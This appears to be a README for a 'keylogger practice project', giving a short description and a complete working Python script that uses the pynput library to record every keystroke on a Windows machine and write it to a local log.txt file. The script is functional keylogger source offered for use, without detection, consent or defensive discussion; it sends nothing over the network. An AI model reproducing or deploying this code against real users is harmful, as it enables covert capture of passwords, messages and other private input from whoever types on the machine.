<h1>Keylogger Practice Project</h1>

<h2>Description</h2>
This script uses the pynput library to listen for keyboard events. The on_press function is called whenever a key is pressed, and it appends the pressed key to a global log list. The key is then written to a file called log.txt.
<br />


<h2>Environments Used </h2>

- <b>Windows 11</b>

<h2>Program Code:</h2>

```python
import pynput
from pynput import keyboard

# import necessary modules

# function to be called whenever a key is pressed
def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    # append the current key to a global variable storing the log
    log.append(current_key)
    # write the log to a file
    with open("log.txt", "w") as f:
        for key in log:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)

# start the keylogger
log = []
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
